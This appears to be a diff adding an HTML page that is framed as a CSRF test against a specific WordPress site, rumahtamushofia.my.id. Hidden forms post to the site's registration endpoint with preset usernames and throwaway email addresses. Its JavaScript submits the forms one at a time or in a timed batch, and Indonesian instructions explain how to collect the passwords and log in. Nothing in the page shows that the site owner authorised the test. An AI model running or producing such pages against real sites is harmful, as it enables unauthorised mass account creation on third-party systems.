@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Mass User Creation Test - 3 Users</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            padding: 25px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+        }
+        .user-section {
+            border: 2px solid rgba(255,255,255,0.3);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.05);
+        }
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin: 5px;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            background: #ff5252;
+            transform: translateY(-2px);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        .btn-success {
+            background: #51cf66;
+        }
+        .btn-success:hover {
+            background: #40c057;
+        }
+        .btn-warning {
+            background: #ffa94d;
+        }
+        .btn-warning:hover {
+            background: #ff922b;
+        }
+        .status {
+            margin: 15px 0;
+            padding: 12px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 8px;
+            border-left: 4px solid #74c0fc;
+        }
+        h1, h2, h3 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .instructions {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 CSRF Mass User Creation Test</h1>
+        <p style="text-align: center;"><strong>Target:</strong> https://rumahtamushofia.my.id</p>
+        
+        <div class="status" id="status">
+            🟢 Ready to test CSRF vulnerability...
+        </div>
+
+        <!-- USER 1 -->
+        <div class="user-section">
+            <h3>👤 User 1: csrf_test_001</h3>
+            <form id="user1" action="https://rumahtamushofia.my.id/wp-login.php?action=register" method="POST">
+                <input type="hidden" name="user_login" value="csrf_test_001">
+                <input type="hidden" name="user_email" value="axgkcteauhecwoofyk@enotj.com">
+                <input type="hidden" name="wp-submit" value="Register">
+            </form>
+            <button onclick="createUser(1)" class="btn-success">🚀 Create User 1</button>
+        </div>
+
+        <!-- USER 2 -->
+        <div class="user-section">
+            <h3>👤 User 2: csrf_test_002</h3>
+            <form id="user2" action="https://rumahtamushofia.my.id/wp-login.php?action=register" method="POST">
+                <input type="hidden" name="user_login" value="csrf_test_002">
+                <input type="hidden" name="user_email" value="csrf002@10minutemail.com">
+                <input type="hidden" name="wp-submit" value="Register">
+            </form>
+            <button onclick="createUser(2)" class="btn-success">🚀 Create User 2</button>
+        </div>
+
+        <!-- USER 3 -->
+        <div class="user-section">
+            <h3>👤 User 3: csrf_test_003</h3>
+            <form id="user3" action="https://rumahtamushofia.my.id/wp-login.php?action=register" method="POST">
+                <input type="hidden" name="user_login" value="csrf_test_003">
+                <input type="hidden" name="user_email" value="csrf003@10minutemail.com">
+                <input type="hidden" name="wp-submit" value="Register">
+            </form>
+            <button onclick="createUser(3)" class="btn-success">🚀 Create User 3</button>
+        </div>
+
+        <!-- BATCH ACTIONS -->
+        <div style="text-align: center; margin: 30px 0;">
+            <button onclick="createAllUsers()" class="btn-warning" style="font-size: 18px; padding: 15px 30px;">
+                💥 CREATE ALL 3 USERS
+            </button>
+            
+            <button onclick="resetTest()" style="background: #868e96; margin-left: 10px;">
+                🔄 Reset Test
+            </button>
+        </div>
+
+        <div class="instructions">
+            <h3>📋 Instructions:</h3>
+            <ol>
+                <li>Buka <a href="https://10minutemail.com" target="_blank" style="color: #74c0fc;">10MinuteMail.com</a> di tab baru</li>
+                <li>Dapatkan 3 email temporary berbeda</li>
+                <li>Ganti email di code dengan email temporary Anda</li>
+                <li>Klik tombol "Create User" untuk test individual</li>
+                <li>Atau klik "CREATE ALL 3 USERS" untuk batch test</li>
+                <li>Check 10MinuteMail untuk password masing-masing user</li>
+                <li>Coba login ke WordPress dengan credentials tersebut</li>
+            </ol>
+            
+            <p><strong>⚠️ Note:</strong> Ganti email values di code dengan email temporary ASLI dari 10MinuteMail!</p>
+        </div>
+
+        <div class="status" id="result">
+            <strong>🎯 Expected Results:</strong>
+            <ul>
+                <li>✅ User created successfully</li>
+                <li>✅ Password email received</li>
+                <li>✅ Able to login as subscriber</li>
+                <li>❌ Cannot change role to administrator</li>
+                <li>❌ Limited to subscriber privileges only</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Status update function
+        function updateStatus(message, type = 'info') {
+            const statusEl = document.getElementById('status');
+            const colors = {
+                info: '#74c0fc',
+                success: '#51cf66', 
+                error: '#ff6b6b',
+                warning: '#ffa94d'
+            };
+            
+            statusEl.innerHTML = message;
+            statusEl.style.borderLeftColor = colors[type] || colors.info;
+            console.log("CSRF TEST: " + message);
+        }
+
+        // Create single user
+        function createUser(userNumber) {
+            const userNames = {
+                1: "csrf_test_001",
+                2: "csrf_test_002", 
+                3: "csrf_test_003"
+            };
+            
+            updateStatus(`🚀 Creating user: ${userNames[userNumber]}...`, 'warning');
+            
+            // Simulate delay for better UX
+            setTimeout(() => {
+                document.getElementById(`user${userNumber}`).submit();
+                updateStatus(`✅ Submitted: ${userNames[userNumber]} - Check 10MinuteMail for password!`, 'success');
+                
+                // Auto-reset status after 5 seconds
+                setTimeout(() => {
+                    updateStatus('🟢 Ready for next test...', 'info');
+                }, 5000);
+            }, 1000);
+        }
+
+        // Create all users sequentially
+        function createAllUsers() {
+            updateStatus('💥 Starting batch creation of 3 users...', 'warning');
+            
+            setTimeout(() => {
+                updateStatus('👤 Creating User 1: csrf_test_001...', 'warning');
+                document.getElementById('user1').submit();
+            }, 1000);
+            
+            setTimeout(() => {
+                updateStatus('👤 Creating User 2: csrf_test_002...', 'warning');
+                document.getElementById('user2').submit();
+            }, 4000);
+            
+            setTimeout(() => {
+                updateStatus('👤 Creating User 3: csrf_test_003...', 'warning');
+                document.getElementById('user3').submit();
+            }, 7000);
+            
+            setTimeout(() => {
+                updateStatus('🎯 All 3 users created! Check 10MinuteMail for passwords.', 'success');
+            }, 10000);
+        }
+
+        // Reset test
+        function resetTest() {
+            updateStatus('🟢 Test reset - Ready to start new test...', 'info');
+        }
+
+        // Debug info
+        console.log("🔴 CSRF Mass Test Loaded Successfully");
+        console.log("🔴 Target: https://rumahtamushofia.my.id");
+        console.log("🔴 Ready to test 3 user creation");
+    </script>
+</body>
+</html>
